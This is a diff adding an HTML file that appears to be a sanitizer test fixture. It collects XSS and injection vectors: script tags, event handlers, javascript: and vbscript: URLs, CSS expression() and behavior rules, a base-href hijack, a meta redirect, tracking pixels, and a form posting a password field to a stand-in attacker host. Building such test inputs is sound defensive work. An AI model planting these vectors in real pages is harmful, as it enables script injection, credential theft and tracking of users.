@@ -1,0 +1,22 @@
+<html><head>
+<base href="https://evil.example/">
+<meta http-equiv="refresh" content="0;url=https://evil.example/">
+<script>alert(1)</script>
+<link rel="stylesheet" href="https://evil.example/x.css">
+</head>
+<body onload="steal()">
+<p onclick="steal()" style="background:url(https://evil.example/t.gif)">Quarterly numbers</p>
+<div style="position:fixed;top:0;left:0;width:100%;height:100%">overlay</div>
+<a href="javascript:alert(2)">click</a>
+<a href="vbscript:msgbox(3)">vb</a>
+<img src="x.png" onerror="alert(4)">
+<img src="https://tracker.example/pixel.gif" alt="t">
+<img src="http://tracker.example/p2.gif">
+<iframe src="https://evil.example/frame"></iframe>
+<form action="https://evil.example/post"><input name="pw"><button>Send</button></form>
+<object data="x.swf"></object><embed src="x.swf">
+<svg><script>alert(5)</script></svg>
+<p style="width:expression(alert(6))">expr</p>
+<p style="color:red;behavior:url(x.htc)">behave</p>
+<span style="color:blue">safe blue</span>
+</body></html>
